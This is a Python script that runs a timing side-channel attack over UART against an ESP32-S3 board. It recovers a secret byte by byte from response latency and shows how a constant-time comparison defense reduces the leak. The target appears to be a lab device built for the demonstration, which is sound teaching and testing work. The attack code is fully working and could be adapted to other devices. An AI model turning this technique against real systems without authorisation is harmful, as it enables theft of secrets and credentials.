"""Real hardware timing attack over UART against ESP32-S3 target.

Sends 'CHECK <hex_candidate>' commands and measures round-trip latency
with time.perf_counter(). The ESP32 firmware uses an early-exit byte
comparison when constant_time defense is OFF, leaking iteration count
through response time.

Expects high trial count (~500+) per guess to average out OS/serial jitter.
"""

from __future__ import annotations

import argparse
import time

import numpy as np
import serial


def toggle_defense(uart: serial.Serial, on: bool):
    cmd = f"DEFENSE CTIME {'ON' if on else 'OFF'}\n"
    uart.write(cmd.encode("ascii"))
    uart.flush()
    resp = uart.readline().decode("ascii", errors="replace").strip()
    print(f"  constant-time {'enabled' if on else 'disabled'}: {resp}")


def measure_guess(uart: serial.Serial, candidate: bytes, trials: int) -> float:
    cand_hex = candidate.hex()
    cmd = f"CHECK {cand_hex}\n".encode("ascii")
    times = np.empty(trials, dtype=np.float64)

    for t in range(trials):
        uart.reset_input_buffer()
        start = time.perf_counter()
        uart.write(cmd)
        uart.flush()
        _ = uart.readline()
        end = time.perf_counter()
        times[t] = end - start

    return float(np.median(times))


def timing_spread(uart: serial.Serial, secret_length: int, trials: int = 200) -> float:
    times = np.empty(256, dtype=np.float64)
    for guess in range(256):
        candidate = bytes([guess]) + bytes(secret_length - 1)
        times[guess] = measure_guess(uart, candidate, trials)
    return float(times.max() - times.min())


def recover_secret(
    uart: serial.Serial,
    secret_length: int,
    trials: int = 500,
    verbose: bool = True,
) -> bytes:
    recovered = bytearray()

    for pos in range(secret_length):
        best_guess, best_time = 0, -1.0
        for guess in range(256):
            candidate = bytes(recovered) + bytes([guess]) + bytes(secret_length - pos - 1)
            avg = measure_guess(uart, candidate, trials)
            if avg > best_time:
                best_time = avg
                best_guess = guess

        recovered.append(best_guess)
        if verbose:
            ch = chr(best_guess) if 32 <= best_guess < 127 else f"0x{best_guess:02x}"
            print(f"  byte {pos}: {ch!r}  ({best_time*1000:.3f} ms)")

    return bytes(recovered)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", default="/dev/ttyAMA0")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--length", type=int, default=4)
    ap.add_argument("--trials", type=int, default=500)
    args = ap.parse_args()

    uart = serial.Serial(args.port, args.baud, timeout=2)
    time.sleep(0.3)

    print("=== Real Hardware Timing Attack ===\n")

    print("--- vulnerable (early-exit) ---")
    toggle_defense(uart, False)
    spread_v = timing_spread(uart, args.length, trials=args.trials)
    print(f"  spread at byte 0: {spread_v*1000:.3f} ms")
    recovered = recover_secret(uart, args.length, trials=args.trials)
    print(f"  RECOVERED: {recovered!r}\n")

    print("--- protected (constant-time) ---")
    toggle_defense(uart, True)
    spread_p = timing_spread(uart, args.length, trials=args.trials)
    print(f"  spread at byte 0: {spread_p*1000:.3f} ms")
    recovered_p = recover_secret(uart, args.length, trials=args.trials, verbose=False)
    print(f"  RECOVERED: {recovered_p!r}")

    ratio = spread_v / max(spread_p, 1e-12)
    print(f"\n  spread reduced {ratio:.1f}x by constant-time defense")


if __name__ == "__main__":
    main()
